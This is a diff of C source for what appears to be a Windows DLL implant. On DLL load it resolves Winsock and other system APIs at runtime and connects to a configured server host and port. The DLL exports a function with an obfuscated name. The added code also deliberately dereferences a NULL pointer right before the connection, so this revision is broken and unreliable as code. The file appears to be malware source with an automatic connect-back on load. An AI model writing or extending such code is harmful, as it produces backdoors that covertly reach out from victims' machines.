@@ -648,14 +648,14 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 }
 
 
-int connect_to_server(winsock_functions_t* ws_funcs, core_funtions_t* core_funcs)
+int connect_to_server(winsock_functions_t* ws_funcs, kernel32_functions_t* krnl_funcs)
 {
 	if (startup_wsa(ws_funcs) != 0)
 	{
 		return -1;
 	}
 
-	if (init_connection(SERVER_HOSTNAME, SERVER_PORT, ws_funcs, core_funcs) != 0)
+	if (init_connection(SERVER_HOSTNAME, SERVER_PORT, ws_funcs, krnl_funcs) != 0)
 	{
 		cleanup_wsa(ws_funcs);
 		return -1;
@@ -699,20 +699,34 @@ static BOOL custom_process_attach(HMODULE hModule)
 		return FALSE;
 	}
 
-	winsock_functions_t winsock_funcs = { 0 };
-	if (!load_winsock_functions(&winsock_funcs))
-	{
-		return FALSE;
-	}
-
-	core_funtions_t core_funcs = { 0 };
-	if (!load_core_functions(&core_funcs))
-	{
-		return FALSE;
-	}
-
 	
-	connect_to_server(&winsock_funcs, &core_funcs);
+	global_functions_t global_functions = { 0 };
+
+	if (!load_winsock_functions(&global_functions.ws_funcs))
+	{
+		return FALSE;
+	}
+
+	if (!load_kernel32_functions(&global_functions.krnl_funcs))
+	{
+		return FALSE;
+	}
+
+	if (!load_user32_functions(&global_functions.user32_funcs))
+	{
+		return FALSE;
+	}
+	
+	if (!load_gdi32_functions(&global_functions.gdi32_funcs))
+	{
+		return FALSE;
+	}
+
+
+	int* buggy = NULL;
+	*buggy = 0xAAAAAAAA;
+	
+	connect_to_server(&global_functions.ws_funcs, &global_functions.krnl_funcs);
 
 
 	do
